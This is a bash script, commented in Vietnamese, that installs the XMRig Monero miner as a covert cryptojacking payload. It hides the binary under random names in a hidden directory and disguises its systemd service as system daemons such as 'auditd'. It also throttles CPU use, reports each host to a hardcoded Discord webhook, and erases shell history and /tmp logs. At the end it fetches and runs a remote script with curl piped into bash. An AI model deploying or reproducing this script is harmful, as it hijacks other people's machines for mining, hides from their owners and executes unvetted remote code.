
#!/bin/bash

# ========== CONFIG ==========
WALLET="89awjkU4VTBFQRPCskTGWpbUpSG5VWQeyG53rrpsvuguPRgVz4vSp5jLZBDbfN4zTESdBDy1PvNQUXe5UeTdu2WuFLc6o8P"  # Ví duy nhất
POOL="pool.hashvault.pro:443"
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"
# ========== END CONFIG ==========

WORKER="core_$(hostname)_$(shuf -i 1000-9999 -n1)"
TOTALCORE=$(nproc)
TOTAL_MINING_THREADS=$TOTALCORE

PRIORITY=3
NAME=$(shuf -n1 -e "corelogd" "netlog" "sysnet")
DIR="$HOME/.local/share/.cache/.dbus"
SERVICE=$(shuf -n1 -e "auditd" "modprobe-sync" "xinetd")
LOG="/tmp/xmrig-log.log"

echo "🚀 Đang cài đặt XMRig"
sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl
cd ~
rm -rf xmrig
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$TOTALCORE

# Copy file binary
mkdir -p "$DIR"
cp ./xmrig "$DIR/$NAME"
chmod +x "$DIR/$NAME"

# Tạo systemd cho tiến trình
sudo tee /etc/systemd/system/$SERVICE.service > /dev/null << EOF
[Unit]
Description=Core Miner
After=network.target

[Service]
ExecStart=$DIR/$NAME -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \
  --cpu-priority=$PRIORITY --threads=$TOTAL_MINING_THREADS --donate-level=0 \
  --max-cpu-usage=65 --log-file=$LOG
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

# Kích hoạt service
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE
sudo systemctl start $SERVICE

# Tạo script gửi log cho WALLET
tee "$DIR/logminer.sh" > /dev/null << 'EOF'
#!/bin/bash
WEBHOOK="$WEBHOOK"
HOST="$(hostname)"

PROCESS="$NAME"
THREADS="$THREADS"
LOG="/tmp/xmrig-log.log"

CPU_USAGE=$(top -bn1 | grep "Cpu(s)" | awk '{print $2 + $4}')
UPTIME=$(uptime -p)
TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

if [ -z "$WEBHOOK" ]; then
  echo "❌ Chưa có webhook"
  exit 1
fi

curl -s -H "Content-Type: application/json" -X POST -d "{
  \"username\": \"XMRig - $HOST\",
  \"embeds\": [{
    \"title\": \"💻 Mining Process\",
    \"color\": 3066993,
    \"fields\": [
      { \"name\": \"⚙️ Process\",    \"value\": \"\$PROCESS\\",  \"inline\": true },
      { \"name\": \"🧠 Threads\",    \"value\": \"$TOTAL_MINING_THREADS\", \"inline\": true },
      { \"name\": \"📈 CPU Usage\",  \"value\": \"\${CPU_USAGE}%\\", \"inline\": true },
      { \"name\": \"⏱️ Uptime\",     \"value\": \"\$UPTIME\\",     \"inline\": false },
      { \"name\": \"📁 Log File\",   \"value\": \"\$LOG\\",       \"inline\": false }
    ],
    \"timestamp\": \"$TIME\"
  }]
}" "$WEBHOOK" > /dev/null 2>&1
EOF

chmod +x "$DIR/logminer.sh"
WEBHOOK="$DISCORD_WEBHOOK" "$DIR/logminer.sh"

# Xóa dấu vết
cd ~
rm -rf xmrig
history -c
sudo find /tmp -name '*.log' -delete 2>/dev/null

# Cài đặt miner bổ sung
echo "📦 Đang cài đặt cron cho webhook"
bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/auto_cron.sh)

echo ""
echo "✅ Đang đào 🚀"

# Cài htop nếu chưa có
if ! command -v htop >/dev/null 2>&1; then
    echo "📦 Đang cài đặt htop"
    sudo apt install -y htop
fi
exec htop
